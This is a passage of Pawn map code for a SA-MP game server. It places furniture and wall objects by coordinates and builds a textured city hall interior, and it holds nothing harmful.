	CreateDynamicObject(2167,1153.6529500,-1305.4807100,16.8420000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2167,1153.6529500,-1304.5446800,16.8420000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(1997,1156.7345000,-1300.8929400,16.9127000,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(1997,1161.8791500,-1299.5339400,16.9127000,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(1808,1158.2119100,-1310.3715800,16.9126000,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(2011,1157.5717800,-1310.2616000,16.9127900,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1502,1155.5727500,-1310.7524400,16.8821000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1502,1160.2518300,-1310.7224100,16.8951000,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(19388,1177.3505900,-1298.4796100,18.5104000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19358,1174.2580600,-1300.0969200,18.5104000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19431,1174.9971900,-1298.4858400,18.5104000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19358,1174.2611100,-1300.6195100,18.5104000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19388,1177.5188000,-1295.2863800,18.5104000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19431,1175.1499000,-1295.2863800,18.5104000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19358,1174.4489700,-1293.6838400,18.5104000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19388,1172.6147500,-1298.4796100,18.5104000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19388,1172.7994400,-1295.2863800,18.5104000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19431,1170.2098400,-1298.4796100,18.5104000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19431,1170.4111300,-1295.2863800,18.5104000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19358,1169.6638200,-1293.6838400,18.5104000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19388,1168.0063500,-1295.2863800,18.5104000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19358,1169.4477500,-1300.1208500,18.5104000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19358,1169.4910900,-1300.6728500,18.5104000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19388,1167.8303200,-1298.4796100,18.5104000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19358,1164.6124300,-1298.4796100,18.5104000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19358,1162.5865500,-1300.5086700,18.5104000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19358,1164.1024200,-1298.4946300,18.5104000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19358,1162.6014400,-1300.0136700,18.5104000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19358,1164.7996800,-1295.2863800,18.5104000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19358,1163.2707500,-1293.7672100,18.5104000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19325,1179.0625000,-1301.9344500,18.1028000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19404,1167.8619400,-1292.0623800,18.5104000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19358,1164.6752900,-1292.0623800,18.5104000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19358,1164.0633500,-1292.0644500,18.5104000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19404,1171.0489500,-1292.0623800,18.5104000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19358,1174.2624500,-1292.0623800,18.5104000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19358,1177.4621600,-1292.0623800,18.5104000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2008,1156.1644300,-1304.3881800,16.9127000,0.0000000,0.0000000,270.0000000); //
	CreateDynamicObject(2008,1156.1623500,-1306.3404500,16.9107000,0.0000000,0.0000000,270.0000000); //
	CreateDynamicObject(19303,1172.4891400,-1298.4491000,18.0052000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1997,1161.8291000,-1301.8692600,16.9127000,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(1997,1161.8376500,-1304.1971400,16.9127000,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(19450,1157.8845200,-1325.2451200,18.5104000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(3396,1155.4893800,-1320.1304900,16.9111000,0.0000000,0.0000000,270.0000000); //
	CreateDynamicObject(2994,1154.5498000,-1311.3626700,17.4082000,0.0000000,0.0000000,270.0000000); //
	CreateDynamicObject(2171,1157.3148200,-1311.8164100,16.9140000,0.0000000,0.0000000,270.0000000); //
	CreateDynamicObject(2184,1161.3173800,-1317.0672600,16.9119000,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(2164,1159.3116500,-1320.7275400,16.9118000,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(2164,1161.0435800,-1320.7275400,16.9118000,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(1808,1162.1101100,-1320.1991000,16.9120000,0.0000000,0.0000000,225.0000000); //
	CreateDynamicObject(2190,1159.2856400,-1316.8641400,17.6857000,0.0000000,0.0000000,20.0000000); //
	CreateDynamicObject(1714,1160.2613500,-1319.1700400,16.9139000,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(1964,1160.1846900,-1317.3374000,17.7924000,0.0000000,0.0000000,160.0000000); //
	CreateDynamicObject(2011,1158.4086900,-1311.3781700,16.9127300,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2606,1160.0423600,-1320.7713600,19.5812000,20.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(2610,1162.2689200,-1311.1549100,17.7075000,0.0000000,0.0000000,270.0000000); //
	CreateDynamicObject(2610,1162.2689200,-1311.6066900,17.7075000,0.0000000,0.0000000,270.0000000); //
	CreateDynamicObject(2610,1162.2689200,-1312.0837400,17.7075000,0.0000000,0.0000000,270.0000000); //
	CreateDynamicObject(2610,1162.2689200,-1312.5606700,17.7075000,0.0000000,0.0000000,270.0000000); //
	CreateDynamicObject(2596,1160.9071000,-1311.1462400,19.5340000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1361,1162.5334500,-1293.0372300,17.6398000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1361,1154.3280000,-1292.8188500,17.6398000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2011,1162.0426000,-1310.0870400,16.9127900,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2011,1154.0147700,-1310.1309800,16.9127900,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2171,1174.0173300,-1301.3584000,13.4980000,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(2186,1162.0900900,-1313.3144500,16.9130000,0.0000000,0.0000000,270.0000000); //
	CreateDynamicObject(2146,1176.7882100,-1298.0058600,13.9171000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19358,1174.5537100,-1297.1212200,15.0864000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2994,1178.4881600,-1300.2935800,13.9279000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2146,1171.2021500,-1297.9106400,13.9171000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2994,1174.0003700,-1297.9465300,13.9279000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2171,1175.4287100,-1301.3315400,13.4980000,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(2146,1171.1583300,-1296.4238300,13.9171000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2994,1173.9934100,-1296.2164300,13.9279000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2171,1174.8363000,-1292.7952900,13.4980000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2171,1173.4384800,-1292.8278800,13.4980000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2994,1178.2785600,-1296.2171600,13.9279000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2146,1176.1329300,-1296.5241700,13.9171000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2603,1163.8942900,-1294.0362500,17.2907000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2596,1169.2627000,-1292.7392600,19.4628000,0.0000000,0.0000000,270.0000000); //
	CreateDynamicObject(2011,1169.0405300,-1294.7482900,16.9046000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2011,1173.8620600,-1294.7873500,16.9046000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2596,1174.0406500,-1292.9395800,19.4628000,0.0000000,0.0000000,270.0000000); //
	CreateDynamicObject(2603,1170.4537400,-1293.6981200,17.2907000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2596,1178.6485600,-1292.6082800,19.4628000,0.0000000,0.0000000,270.0000000); //
	CreateDynamicObject(2011,1178.6491700,-1294.8883100,16.9046000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2603,1175.1491700,-1293.6149900,17.2907000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2603,1174.9858400,-1300.7619600,17.2907000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2011,1178.4321300,-1298.9978000,16.9046000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2596,1178.6507600,-1298.9018600,19.4628000,0.0000000,0.0000000,270.0000000); //
	CreateDynamicObject(2603,1170.1602800,-1300.5894800,17.2907000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2011,1173.7205800,-1301.5826400,16.9046000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19305,1173.7074000,-1298.5474900,18.3697000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19305,1171.4187000,-1298.4033200,18.3697000,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(2603,1163.3138400,-1300.7509800,17.2907000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2011,1168.8192100,-1301.4473900,16.9046000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2596,1169.0385700,-1299.1748000,19.4628000,0.0000000,0.0000000,270.0000000); //
	CreateDynamicObject(1523,1167.0410200,-1298.5629900,16.9055000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1523,1167.2120400,-1295.3291000,16.9055000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1523,1172.0155000,-1295.3249500,16.9055000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1523,1176.7182600,-1295.3211700,16.9055000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1523,1176.5524900,-1298.5022000,16.9055000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1997,1155.8206800,-1316.1341600,16.9127000,0.0000000,0.0000000,180.0000000); //

	// ---------------------------- INTERIOR DA CÂMARA MUNICIPAL ----------------------------

	new mariaintaa;

	mariaintaa = CreateDynamicObjectEx(19454,1473.055,-1732.937,1049.948,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19458,1473.055,-1732.937,1053.448,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 3603, "bevmans01_la", "hottop5d_law", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1473.055,-1732.937,1056.949,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1473.055,-1720.097,1049.948,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19458,1473.054,-1720.097,1053.448,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 3603, "bevmans01_la", "hottop5d_law", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1473.054,-1720.097,1056.949,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19462,1468.382,-1726.564,1050.963,0.000,90.000,89.994,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 10023, "bigwhitesfe", "archgrnd2_SFE", 0);
	mariaintaa = CreateDynamicObjectEx(19376,1468.382,-1733.309,1050.963,0.000,90.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 18065, "ab_sfammumain", "gun_floor1", 0);
	mariaintaa = CreateDynamicObjectEx(19376,1468.382,-1719.824,1050.963,0.000,90.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 18065, "ab_sfammumain", "gun_floor1", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1473.630,-1729.952,1049.948,0.000,0.000,270.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19458,1473.630,-1729.953,1053.448,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 3603, "bevmans01_la", "hottop5d_law", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1473.630,-1723.195,1049.948,0.000,0.000,270.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19458,1473.630,-1723.196,1053.448,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 3603, "bevmans01_la", "hottop5d_law", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1473.630,-1729.952,1056.949,0.000,0.000,270.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1473.630,-1723.195,1056.949,0.000,0.000,270.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1468.869,-1718.466,1049.948,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19458,1468.869,-1718.466,1053.448,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 3603, "bevmans01_la", "hottop5d_law", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1468.869,-1718.466,1056.949,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1468.869,-1734.680,1049.948,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19458,1468.869,-1734.680,1053.448,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 3603, "bevmans01_la", "hottop5d_law", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1468.869,-1734.680,1056.949,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19452,1461.382,-1719.829,1050.963,0.000,90.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 18065, "ab_sfammumain", "gun_floor1", 0);
	mariaintaa = CreateDynamicObjectEx(19452,1461.382,-1733.309,1050.963,0.000,90.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 18065, "ab_sfammumain", "gun_floor1", 0);
	mariaintaa = CreateDynamicObjectEx(19458,1464.138,-1738.033,1053.448,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 3603, "bevmans01_la", "hottop5d_law", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1464.138,-1738.033,1056.949,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19435,1460.432,-1723.203,1052.800,0.000,0.000,270.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19435,1459.734,-1730.730,1056.300,0.000,0.000,179.994,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19435,1459.717,-1722.496,1056.300,0.000,0.000,180.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19435,1461.158,-1722.481,1056.300,0.000,0.000,179.994,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19435,1460.442,-1721.770,1052.800,0.000,0.000,270.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19435,1459.716,-1722.496,1052.800,0.000,0.000,179.994,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19435,1460.432,-1723.202,1056.300,0.000,0.000,270.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19435,1460.442,-1721.769,1056.300,0.000,0.000,270.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19435,1461.158,-1722.481,1052.800,0.000,0.000,179.994,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19435,1460.449,-1729.990,1052.800,0.000,0.000,270.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19435,1461.162,-1730.706,1052.800,0.000,0.000,179.994,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19435,1460.447,-1731.434,1052.800,0.000,0.000,270.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19435,1459.734,-1730.708,1052.800,0.000,0.000,179.994,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19435,1460.447,-1731.434,1056.300,0.000,0.000,270.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19435,1460.449,-1729.990,1056.300,0.000,0.000,270.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19435,1461.162,-1730.706,1056.300,0.000,0.000,179.994,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19462,1457.708,-1719.819,1050.963,0.000,90.000,359.994,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 10023, "bigwhitesfe", "archgrnd2_SFE", 0);
	mariaintaa = CreateDynamicObjectEx(19362,1457.715,-1738.033,1056.300,0.000,0.000,270.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19362,1457.715,-1714.923,1052.800,0.000,0.000,270.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19462,1457.708,-1733.309,1050.963,0.000,90.000,359.983,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 10023, "bigwhitesfe", "archgrnd2_SFE", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1464.138,-1714.924,1049.948,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1464.138,-1738.033,1049.948,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19458,1464.138,-1714.923,1053.448,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 3603, "bevmans01_la", "hottop5d_law", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1464.138,-1714.923,1056.949,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19362,1457.715,-1714.923,1056.300,0.000,0.000,270.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19391,1457.715,-1738.033,1052.800,0.000,0.000,270.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19452,1454.031,-1733.309,1050.963,0.000,90.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 18065, "ab_sfammumain", "gun_floor1", 0);
	mariaintaa = CreateDynamicObjectEx(19452,1454.031,-1719.829,1050.963,0.000,90.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 18065, "ab_sfammumain", "gun_floor1", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1451.324,-1738.033,1049.948,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19458,1451.308,-1738.033,1053.448,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 3603, "bevmans01_la", "hottop5d_law", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1451.308,-1738.033,1056.949,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1451.308,-1714.924,1049.948,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19458,1451.308,-1714.923,1053.448,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 3603, "bevmans01_la", "hottop5d_law", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1451.308,-1714.923,1056.949,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19452,1450.531,-1719.829,1050.963,0.000,90.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 18065, "ab_sfammumain", "gun_floor1", 0);
	mariaintaa = CreateDynamicObjectEx(19452,1450.531,-1733.309,1050.963,0.000,90.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 18065, "ab_sfammumain", "gun_floor1", 0);
	mariaintaa = CreateDynamicObjectEx(19462,1449.119,-1726.564,1050.963,0.000,90.000,89.994,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 10023, "bigwhitesfe", "archgrnd2_SFE", 0);
	mariaintaa = CreateDynamicObjectEx(19462,1458.748,-1726.564,1050.963,0.000,90.000,89.994,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 10023, "bigwhitesfe", "archgrnd2_SFE", 0);
	mariaintaa = CreateDynamicObjectEx(19452,1447.032,-1719.829,1050.963,0.000,90.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 18065, "ab_sfammumain", "gun_floor1", 0);
	mariaintaa = CreateDynamicObjectEx(19452,1447.031,-1733.310,1050.958,0.000,90.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 18065, "ab_sfammumain", "gun_floor1", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1446.471,-1733.062,1056.949,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19458,1446.472,-1733.062,1053.448,0.000,0.000,179.994,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 3603, "bevmans01_la", "hottop5d_law", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1446.470,-1710.583,1049.948,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1446.472,-1733.062,1049.948,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1446.470,-1720.217,1049.948,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19379,1490.311,-1712.238,1146.026,0.000,90.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 14674, "civic02cj", "ab_hosWallUpr", 0);
	mariaintaa = CreateDynamicObjectEx(19379,1457.691,-1752.567,1057.978,0.000,90.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 14674, "civic02cj", "ab_hosWallUpr", 0);
	mariaintaa = CreateDynamicObjectEx(7093,1451.353,-1726.936,1061.057,0.000,0.000,37.985,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(7093,1451.354,-1721.036,1061.057,0.000,0.000,37.996,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(7093,1451.353,-1716.710,1061.057,0.000,0.000,37.990,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(7093,1451.353,-1731.310,1061.057,0.000,0.000,37.990,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1453.405,-1734.244,1056.949,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1453.405,-1715.114,1056.949,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1453.404,-1724.746,1056.949,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(7093,1461.066,-1728.144,1061.078,0.000,0.000,55.980,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1468.602,-1729.957,1049.948,0.000,0.000,270.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(7093,1465.901,-1728.143,1061.078,0.000,0.000,55.964,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1468.632,-1730.005,1056.916,0.000,0.000,270.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19362,1460.000,-1736.064,1049.948,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(7093,1456.925,-1733.022,1061.078,0.000,0.000,69.982,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
